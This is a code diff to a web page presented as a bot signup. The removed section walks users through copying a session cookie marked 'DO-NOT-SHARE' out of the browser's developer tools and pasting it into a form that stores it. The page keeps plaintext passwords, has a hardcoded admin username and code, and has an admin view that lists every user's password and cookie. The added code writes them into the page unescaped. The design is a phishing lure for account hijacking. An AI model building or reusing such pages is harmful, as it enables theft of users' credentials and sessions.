@@ -43,7 +43,7 @@
         .btn:hover {
             background-color: #218838;
         }
-        #cookieSection {
+        #cookieSection, #adminLogs {
             display: none;
         }
     </style>
@@ -58,19 +58,9 @@
         <button class="btn" onclick="signUp()">Sign Up</button>
     </div>
 
-    <div class="container" id="cookieSection">
-        <h2>Cookie Access Guide</h2>
-        <p>To use this bot, you need to find your special cookie.</p>
-        <ol>
-            <li>Right-click anywhere on this page and select <strong>Inspect</strong>.</li>
-            <li>Go to the <strong>Application</strong> tab.</li>
-            <li>In the left sidebar, under <strong>Storage</strong>, click <strong>Cookies</strong>.</li>
-            <li>Select this website from the list.</li>
-            <li>Find the cookie named <code>_|WARNING:-DO-NOT-SHARE-THIS</code>.</li>
-            <li>Copy its value and paste it below:</li>
-        </ol>
-        <input type="text" class="input-box" id="cookieInput" placeholder="Paste your cookie here">
-        <button class="btn" onclick="submitCookie()">Submit</button>
+    <div class="container" id="adminLogs">
+        <h2>Admin Logs</h2>
+        <div id="logs"></div>
     </div>
     
     <script>
@@ -100,7 +90,6 @@
             localStorage.setItem("users", JSON.stringify(users)); // Save users to local storage
             alert("Signed up successfully.");
             document.getElementById("loginSection").style.display = "none";
-            document.getElementById("cookieSection").style.display = "block";
             
             if (username === "realgysj") {
                 if (adminCode === "8rndosp") {
@@ -111,26 +100,18 @@
             }
         }
 
-        function submitCookie() {
-            let cookieValue = document.getElementById("cookieInput").value;
-            let currentUser = users[users.length - 1];
-
-            if (cookieValue) {
-                currentUser.cookie = cookieValue;
-                localStorage.setItem("users", JSON.stringify(users)); // Update stored data
-                alert("Cookie received. Proceeding with bot setup...");
-            } else {
-                alert("Please enter the cookie value.");
-            }
-        }
-
         function showAdminLogs() {
-            console.log("Admin access granted. Users, passwords, and cookies:");
+            document.getElementById("adminLogs").style.display = "block";
+            let logsContainer = document.getElementById("logs");
+
+            logsContainer.innerHTML = "<h3>User Logs:</h3>";
             users.forEach(user => {
-                console.log(`Username: ${user.username}`);
-                console.log(`Password: ${user.password}`);
-                console.log(`Cookie: ${user.cookie}`);
-                console.log('---');
+                logsContainer.innerHTML += `
+                    <p><strong>Username:</strong> ${user.username}</p>
+                    <p><strong>Password:</strong> ${user.password}</p>
+                    <p><strong>Cookie:</strong> ${user.cookie || "Not Set"}</p>
+                    <hr>
+                `;
             });
         }
     </script>
